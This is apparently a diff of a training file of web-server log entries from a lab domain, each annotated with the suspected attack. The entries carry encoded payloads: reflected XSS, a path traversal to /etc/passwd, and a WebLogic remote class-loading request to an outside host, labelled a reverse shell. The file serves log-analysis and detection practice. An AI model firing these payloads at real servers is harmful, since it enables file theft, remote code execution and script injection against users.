@@ -152,17 +152,15 @@ payload = _nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackag
 potential_attack = vrode os injection ili SSTI + SSRF
 
 
-Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab                 pottential_attack = XSS(Reflected)
+Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab                
+pottential_attack = XSS(Reflected)
 
 
 2023-02-15T08:32:00	dev.kaspi.lab 443 78.109.191.117 10.2.50.21	80	POST /page/api/login/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+12;+SM-A315F+Build/SP1A.210812.016;+wv)	view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd	kaspi.lab
-
 pottential_attack = LFI
 
 2023-02-15T08:32:00	forum.kaspi.lab 443	79.133.190.153 10.2.1.12	80	POST	/bottles/dashboardapi2/api/v1/Dashboard/getSampleRequest	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(iPhone;+CPU+iPhone+OS+13,4+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148	_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29	kaspi.lab
-
 pottential_attack = Reverse Shell (Reverse TCP, connect-back)
 
 2023-02-15T08:32:00 data.kaspi.lab 443 85.117.101.213 10.2.1.12 80 GET /market/api/v2/orders - 200 2265 2780 0 2479 16947 HTTP/1.1 Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab
-
 pottential_attack = xss
